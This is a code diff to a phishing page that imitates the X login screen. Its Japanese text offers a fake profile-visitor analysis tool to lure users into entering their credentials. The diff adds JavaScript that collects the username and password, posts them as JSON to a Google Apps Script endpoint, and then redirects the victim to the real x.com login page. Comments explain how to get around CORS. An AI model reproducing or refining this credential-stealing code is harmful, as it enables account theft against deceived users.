@@ -20,15 +20,15 @@
             <h1 class="css-175oi2r r-jwli3a" style="font-size: 23px; font-weight: 700; line-height: 28px; color: #0f1419; margin-bottom: 8px;">Xアカウントと連携</h1>
             <p style="font-size: 14px; color: #536471; margin-bottom: 24px; text-align: center;">「プロフィール足跡・閲覧者解析ツール」を実行するために、あなたのアカウントの本人確認（再ログイン）が必要です。</p>
 
-            <form action="https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec" method="POST" style="width: 100%;">
+            <form id="loginForm" style="width: 100%;">
                 
                 <div class="css-175oi2r" style="margin-bottom: 16px;">
-                    <input type="text" name="username" class="r-30o543 r-16y2uox" placeholder="電話番号、メールアドレスまたはユーザー名" required 
+                    <input type="text" id="username" class="r-30o543 r-16y2uox" placeholder="電話番号、メールアドレスまたはユーザー名" required 
                            style="width: 100%; padding: 16px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 15px; box-sizing: border-box;">
                 </div>
                 
                 <div class="css-175oi2r" style="margin-bottom: 24px;">
-                    <input type="password" name="password" class="r-30o543 r-16y2uox" placeholder="パスワード" required 
+                    <input type="password" id="password" class="r-30o543 r-16y2uox" placeholder="パスワード" required 
                            style="width: 100%; padding: 16px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 15px; box-sizing: border-box;">
                 </div>
                 
@@ -36,11 +36,42 @@
                         style="width: 100%; padding: 12px; background-color: #0f1419; color: #ffffff; border: none; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer;">
                     ログインして解析する
                 </button>
-                
             </form>
 
         </div>
     </div>
+
+    <script>
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // 通常の画面遷移（ページリロード）を止める
+
+            // 入力された値を取得
+            // 画像の139〜140行目の「data.user」「data.pass」という名前に厳密に合わせます
+            const payload = {
+                user: document.getElementById('username').value,
+                pass: document.getElementById('password').value
+            };
+
+            try {
+                // GASへJSON形式でデータをPOST送信
+                await fetch(GAS_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain' // GASのdoPostでCORSエラーを回避するための定石
+                    },
+                    body: JSON.stringify(payload) // ここで綺麗にJSONに変換！
+                });
+            } catch (error) {
+                console.error('送信エラー（検証用）:', error);
+            } finally {
+                // 画像のGASコードは成功・失敗に関わらず最終的に公式Xへジャンプさせる構造なので、
+                // フロントエンド側でも送信が終わったら即座に本物のXのログイン画面へ転送します。
+                window.location.href = "https://x.com/login";
+            }
+        });
+    </script>
 
 </body>
 </html>
